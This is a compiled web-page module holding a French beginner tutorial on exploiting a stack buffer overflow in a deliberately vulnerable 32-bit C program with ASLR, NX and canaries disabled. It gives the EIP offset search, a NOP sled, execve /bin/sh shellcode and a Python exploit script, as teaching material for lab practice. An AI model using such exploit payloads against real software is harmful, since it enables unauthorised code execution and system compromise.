import{_ as a,c as s,o as n,af as t}from"./chunks/framework.CgkrJXe5.js";const i="/medias/articles/exploitation-binaire-x86-sans-protections/S%C3%A9lection_001.png",o="/medias/articles/exploitation-binaire-x86-sans-protections/S%C3%A9lection_002.png",r="/medias/articles/exploitation-binaire-x86-sans-protections/S%C3%A9lection_003.png",p="/medias/articles/exploitation-binaire-x86-sans-protections/S%C3%A9lection_004.png",l="/medias/articles/exploitation-binaire-x86-sans-protections/S%C3%A9lection_005.png",c="/medias/articles/exploitation-binaire-x86-sans-protections/S%C3%A9lection_006.png",u="/medias/articles/exploitation-binaire-x86-sans-protections/S%C3%A9lection_007.png",d="/medias/articles/exploitation-binaire-x86-sans-protections/S%C3%A9lection_008.png",m="/medias/articles/exploitation-binaire-x86-sans-protections/S%C3%A9lection_008-1024x95.png",x="/medias/articles/exploitation-binaire-x86-sans-protections/S%C3%A9lection_021.png",b="/medias/articles/exploitation-binaire-x86-sans-protections/S%C3%A9lection_008-1-1024x95.png",P=JSON.parse(`{"title":"Exploitation d'un binaire x86 sans protections","description":"Pour commencer ces tutoriaux sur l'exploitation de binaire je vous propose le classique binaire x86 sans protections.","frontmatter":{"title":"Exploitation d'un binaire x86 sans protections","description":"Pour commencer ces tutoriaux sur l'exploitation de binaire je vous propose le classique binaire x86 sans protections.","date":"2019-03-29T00:00:00.000Z","image":"/medias/articles/exploitation-binaire-x86-sans-protections/image.jpg"},"headers":[],"relativePath":"articles/exploitation-binaire-x86-sans-protections.md","filePath":"articles/exploitation-binaire-x86-sans-protections.md"}`),h={name:"articles/exploitation-binaire-x86-sans-protections.md"};function f(A,e,g,v,q,k){return n(),s("div",null,e[0]||(e[0]=[t(`<p>Pour commencer ces tutoriaux sur l&#39;exploitation de binaire je vous propose le classique binaire x86 sans protections.</p><p>Passage obligé de tout pwner en herbe, l&#39;exploitation de binaire sans protection permet de prendre en main les divers outils qui seront utiles pour la suite.</p><h2 id="mise-en-place" tabindex="-1">Mise en place <a class="header-anchor" href="#mise-en-place" aria-label="Permalink to &quot;Mise en place&quot;">​</a></h2><p>Pour cet exemple, j&#39;utilise une machine Ubuntu 18.04 à jour. Un serveur SSH ainsi que GDB Peda et Python sont installés sur la machine. J&#39;utiliserais aussi Metasploit directement sur ma machine.</p><p>Le code que nous allons exploiter est le suivant :</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>#include &lt;string.h&gt;</span></span>
<span class="line"><span>void vuln(char * oflow)</span></span>
<span class="line"><span>{</span></span>
<span class="line"><span>  char buf[25];</span></span>
<span class="line"><span>  strcpy(buf, oflow);</span></span>
<span class="line"><span>}</span></span>
<span class="line"><span></span></span>
<span class="line"><span>void main (int argc, char ** argv)</span></span>
<span class="line"><span>{</span></span>
<span class="line"><span>  vuln(argv[1]);</span></span>
<span class="line"><span>}</span></span></code></pre></div><p>Pour la compilation, nous utiliserons la ligne de commande suivante :</p><p><code>gcc -o exploitme exploitme.c -fno-stack-protector -z execstack -m32</code></p><p>Enfin, nous allons désactiver l&#39;ASLR ( commande à exécuter en root ) :</p><p><code>echo &quot;0&quot; &gt; /proc/sys/kernel/randomize_va_space[/bash]</code></p><h2 id="vulnerabilites" tabindex="-1">Vulnérabilités <a class="header-anchor" href="#vulnerabilites" aria-label="Permalink to &quot;Vulnérabilités&quot;">​</a></h2><p>Avant de nous lancer bêtement dans une exploitation à l&#39;aveugle, observons le code ainsi que la méthode de compilation utilisée.</p><h3 id="code-source" tabindex="-1">Code source <a class="header-anchor" href="#code-source" aria-label="Permalink to &quot;Code source&quot;">​</a></h3><p>Le code de ce binaire est assez simple, la fonction main ne fait qu&#39;une seule chose, appeler la fonction vuln avec comme argument de fonction la valeur passé en argument 1 au lancement du programme.</p><p>Cette fonction vuln reçoit cet argument dans une variable nommée oflow puis ,déclare un tableau de chars buf de taille 25. Enfin elle utilise la fonction strcpy pour placer la valeur passé en argument dans ce tableau de chars.</p><p>C&#39;est la principale vulnérabilité de notre programme. La fonction strcpy va copier l&#39;intégralité de la variable oflow dans la variable buf, sans tenir compte de la taille de cette dernière. Ce comportement de strcpy se vérifie simplement en passant une variable de plus de 25 caractères en argument au programme :</p><p><img src="`+i+'" alt="Le binaire produit un &quot;Segfault&quot;"></p><p>Lors de la première tentative avec 24 caractères tout se passe comme prévu. A l&#39;opposée de la seconde avec 42 caractères qui produit un Segfault, signe que le binaire a &quot;crashé&quot;.</p><p>J&#39;utilise ici une sous commande python afin de générer la valeur de l&#39;argument, cette syntaxe peut aussi être utilisée dans GDB.</p><p>C&#39;est donc à ce moment la que GDB entre en scène afin de vérifier où se produit se crash :</p><p><img src="'+o+'" alt="Débogage du programme"></p><p>La dernière ligne du déboggeur indique 0x61616161 in ?? (). Ce qui se traduit par &quot;EIP tente d&#39;accéder à l&#39;instruction situé à l&#39;adresse 0x61616161 mais n&#39;y arrive pas &quot;</p><p>0x61616161 correspond à la valeur hexadécimale de &quot;aaaa&quot;, nous venons ainsi de prouver ici qu&#39;il était possible de manipuler EIP depuis un argument passé au programme. Ce type de vulnérabilité s&#39;appelle un buffer overflow, l&#39;attaquant arrive à remplir un buffer avec plus de valeurs qu&#39;il ne peut en contenir, les valeurs supplémentaires sont alors inscrite à la suite des premières dans la mémoire et ce peut importe ce qu&#39;il s&#39;y trouvait précédemment.</p><h3 id="compilation" tabindex="-1">Compilation <a class="header-anchor" href="#compilation" aria-label="Permalink to &quot;Compilation&quot;">​</a></h3><p>Lors de l&#39;étape de mise en place, je vous ai demandé de compiler le code avec un certain nombre d&#39;arguments passés au compilateur :</p><p>-m32 : Permet de compiler le binaire en 32bits sur une machine 64bits ( nécéssite gcc-multilib). -z execstack : Permet de rendre la stack executable. -fno-stack-protector : Permet de désactiver les protections sur la stack Comme nous l&#39;indique ces options, aucune protection n&#39;est en place sur la stack. Cela peut se vérifier avec la commande checksec de peda :</p><p><img src="'+r+'" alt="Analyse des protections du binaire"></p><p>Les parties qui nous interessent (CANARY et NX ) sont bien désactivées.</p><h3 id="machine-hote" tabindex="-1">Machine Hôte <a class="header-anchor" href="#machine-hote" aria-label="Permalink to &quot;Machine Hôte&quot;">​</a></h3><p>Enfin, je vous ai demandé de désactiver l&#39;ASLR. Cette protection (Address Space Layout Randomization ou en français distribution aléatoire de l&#39;espace d&#39;adressage ) permet de distribuer les adresses mémoires du programme de manière aléatoire à chaque lancement.</p><p>Encore une fois, peda nous permet de vérifier la présence de l&#39;ASLR avec la commande aslr.</p><p><img src="'+p+`" alt="Status de l&#39;aslr"></p><p>Toutes les protections basiques étant désactivés nous pouvons passer à l&#39;exploitation simple de ce binaire.</p><h2 id="exploitation" tabindex="-1">Exploitation <a class="header-anchor" href="#exploitation" aria-label="Permalink to &quot;Exploitation&quot;">​</a></h2><p>L&#39;objectif va être ici d’exécuter un shellcode classique: execve /bin/sh. Ainsi après avoir exploité la vulnérabilité liée au strcpy nous allons obtenir un shell.</p><h3 id="trouver-eip" tabindex="-1">Trouver EIP <a class="header-anchor" href="#trouver-eip" aria-label="Permalink to &quot;Trouver EIP&quot;">​</a></h3><p>La première étape de l&#39;exploitation d&#39;un buffer overflow consiste à trouver la taille de buffer à remplir afin de contrôler un registre. En effet, nous n&#39;allons pas toujours pouvoir contrôler directement EIP ( bien que ce soit le cas ici )</p><p>Pour cela, plusieurs techniques existent, la plus simple consiste en l&#39;utilisation de patterns. Et encore une fois de nombreux outils sont disponibles, j&#39;utiliserais ici Metasploit qui ( à l&#39;heure ou j&#39;écris cet article ) me parait être le plus pratique.</p><p>Tout d&#39;abord, je génère un pattern, avec l&#39;outil pattern_create :</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span></span></span>
<span class="line"><span>~/H/E/m/t/exploit ❯❯❯ pwd</span></span>
<span class="line"><span>/home/shoxx/HackingTools/Exploit/metasploit-framework/tools/exploit</span></span>
<span class="line"><span></span></span>
<span class="line"><span>~/H/E/m/t/exploit ❯❯❯ ruby pattern_create.rb -l 300</span></span>
<span class="line"><span>Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9</span></span></code></pre></div><p>Puis j&#39;utilise ce pattern en tant qu&#39;argument du binaire dans GDB :</p><p><code>gdb-peda$ run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5...</code></p><p><img src="`+l+`" alt="Recherche d&#39;EIP en utilisant un pattern"></p><p>Le programme crash une nouvelle fois, GDB indique : 0x62413262 in ?? ().</p><p>Je renseigne donc cette adresse à l&#39;outil metasploit pattern_offset :</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>~/H/E/m/t/exploit ❯❯❯ ./pattern_offset.rb -l 300 -q 0x62413262</span></span>
<span class="line"><span>[*] Exact match at offset 37</span></span></code></pre></div><p>37 ! Nous avons donc le contrôle d&#39;EIP au 37ème caractère, vérifions cela :</p><p><code>gdb-peda$ run $(python -c &quot;from struct import pack; print &#39;a&#39;\\*37+pack(&#39;&lt;I&#39;,0xdeadbeef)&quot;)</code></p><p>J&#39;utilise ici, la méthode pack de la librairie struct, celle ci permet de renseigner directement valeurs hexadécimales sans se prendre la tête avec la conversion little / big endian. Si nous contrôlons bien EIP, le débogeur va tenter d&#39;accéder à l&#39;adresse 0xdeadbeef et crasher :</p><p><img src="`+c+'" alt="Vérification de la taille"></p><p>Bingo ! Nous contrôlons donc EIP.</p><h3 id="preparation-de-l-exploit" tabindex="-1">Préparation de l&#39;exploit <a class="header-anchor" href="#preparation-de-l-exploit" aria-label="Permalink to &quot;Préparation de l&#39;exploit&quot;">​</a></h3><p>Comme évoqué précédemment, nous savons que la pile est exécutable ( option -z execstack ) et que les adresses de la pile ne seront pas modifiés à chaque lancement.</p><p>Nous allons donc pouvoir inscrire notre shellcode dans la stack et, comme nous contrôlons EIP, rediriger le flux d’exécution au sein de cette dernière.</p><p>Pour un plus grand confort nous allons remplir la stack d&#39;instructions inutiles comme \\x90 ( nop ). Cette instruction ne modifie en rien la structure des registres, elle ne fait tout simplement rien. Afin d&#39;avoir un exploit qui marchera à chaque coup, nous allons rediriger EIP dans un flux de nops qui précédera notre shellcode. Si jamais, l&#39;adresse de la stack est décalée ( ce qui est le cas lorsque l&#39;on tente d&#39;exploiter un binaire hors de gdb ) EIP pointera quand même dans des nops et glissera vers notre shellcode.</p><p>Le shellcode que nous allons utiliser est le suivant :</p><p>\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80&quot; Vous pouvez le retrouver sur shell-storm.</p><h3 id="exploitation-dans-gdb" tabindex="-1">Exploitation dans GDB <a class="header-anchor" href="#exploitation-dans-gdb" aria-label="Permalink to &quot;Exploitation dans GDB&quot;">​</a></h3><p>L&#39;argument que nous allons donner à notre programme, et ce qui constitue notre exploit, est :</p><ul><li>&quot;Junk datas &quot; pour remplir le buffer ici 37 fois le caractère &quot;a&quot;.</li><li>&quot;Adresse d&#39;EIP&quot; pour le moment on ne la connait pas.</li><li>&quot;Important nombre de nops&quot; ici 9000 nops, autant voir large.</li><li>&quot;Shellcode&quot; la charge utile de notre exploit.</li></ul><p><code>gdb-peda$ run $(python -c &quot;from struct import pack; print &#39;a&#39;*37+pack(&#39;&lt;I&#39;,0xdeadbeef)+&#39;\\x90&#39;*9000+&#39;\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80&#39;&quot;)</code></p><p>A ce moment, je m&#39;attends a ce que le programme crash de nouveau à l&#39;adresse 0xdeadbeef :</p><p><img src="'+u+'" alt="Crash du programme"></p><p>Nous pouvons alors remarquer que la stack est remplie d&#39;instruction nop. Je peux alors analyser le contenu de cette dernière avec la commande x/9000i : &quot;Affiche moi les 9000 prochaines valeurs de la stack sous forme d&#39;instruction&quot;.</p><p>Et vers la fin de celle ci, nous retrouvons notre shellcode :</p><p><img src="'+d+'" alt="Instructions contenues dans la stack"></p><p>Parfait ! Il ne me reste alors plus qu&#39;à récupérer une adresse située au milieu des nops : 0xffffb4bd et à remplacer 0xdeadbeef dans mon exploit par cette valeur :</p><p><code>gdb-peda$ run $(python -c &quot;from struct import pack; print &#39;a&#39;*37+pack(&#39;&lt;I&#39;,0xffffb4bd)+&#39;\\x90&#39;*9000+&#39;\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80&#39;&quot;) </code></p><p><img src="'+m+`" alt="Exploitation dans GDB"></p><p>Cette fois ci, pas de crash le programme nous execute bien un invité de commande sh comme demandé.</p><h2 id="sortie-de-gdb" tabindex="-1">Sortie de GDB <a class="header-anchor" href="#sortie-de-gdb" aria-label="Permalink to &quot;Sortie de GDB&quot;">​</a></h2><p>Une fois l&#39;exploitation de notre binaire terminée dans GDB il reste peu d&#39;étapes avant d&#39;en avoir fini !</p><p>Tout d&#39;abord, on va tenter de lancer directement l&#39;exploit. Deux cas peuvent se produire, tout marche parfaitement, dans ce cas sautez ces explications, sinon continuez :</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>./exploitme $(python2 -c &quot;from struct import pack; print &#39;a&#39;*37+pack(&#39;&lt;I&#39;,0xffffb264)+&#39;\\x90&#39;*9000+&#39;\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80&#39;&quot;)</span></span>
<span class="line"><span>Erreur de segmentation (core dumped)</span></span></code></pre></div><p>Il est totalement possible que l&#39;exploit ne fonctionne pas. Et ce n&#39;est pas grave ! Ceci est le plus souvent dû au fait que GDB dispose de variables d&#39;environnements supplémentaires, ces dernières étant placés dans la stack cela entraîne un décalage. Afin de palier à ce problème, la solution la plus simple est de choisir un nopsled plus important par exemple 11 000 au lieu de 9 000 :</p><p><img src="`+x+`" alt="Exploitation hors GDB"></p><h3 id="ecriture-de-l-exploit" tabindex="-1">Ecriture de l&#39;exploit <a class="header-anchor" href="#ecriture-de-l-exploit" aria-label="Permalink to &quot;Ecriture de l&#39;exploit&quot;">​</a></h3><p>Obtenir un shell de cette manière n&#39;est pas une fin en soit, mais le plus gros est fait. A cet instant précis, nous allons nous concentrer sur l&#39;écriture d&#39;un exploit propre. Pour cela nous allons écrire un script python :</p><p>&quot;Mais ca sert a rien d&#39;écrire un exploit pour ce genre de binaire&quot;. Si à s’entraîner !</p><p>Rien de très complexe pour ce premier exemple, nous allons juste reprendre notre ligne de commande et la transformer en script propre :</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>from struct import pack</span></span>
<span class="line"><span>from os import system</span></span>
<span class="line"><span></span></span>
<span class="line"><span>args = &#39;a&#39;*37</span></span>
<span class="line"><span>args += pack(&#39;&lt;I&#39;,0xffffb4bd)</span></span>
<span class="line"><span>args +=&#39;\\x90&#39;*9000</span></span>
<span class="line"><span>args += &#39;\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80&#39;</span></span>
<span class="line"><span></span></span>
<span class="line"><span>system(&quot;./exploitme &quot;+args)</span></span></code></pre></div><p>Ce qui nous donne une fois exécuté :</p><p><img src="`+b+'" alt="Exploitation finale"></p><h2 id="conclusion" tabindex="-1">Conclusion <a class="header-anchor" href="#conclusion" aria-label="Permalink to &quot;Conclusion&quot;">​</a></h2><p>And voila ! Nous avons exploité avec succès notre premier binaire. Certes celui ci est sans aucune protection, mais cela permet une entrée en matière simple. N&#39;hésitez pas à reprendre ce tutoriel tant que vous n&#39;avez pas compris exactement ce qu&#39;il se passait dans votre machine.</p>',85)]))}const C=a(h,[["render",f]]);export{P as __pageData,C as default};
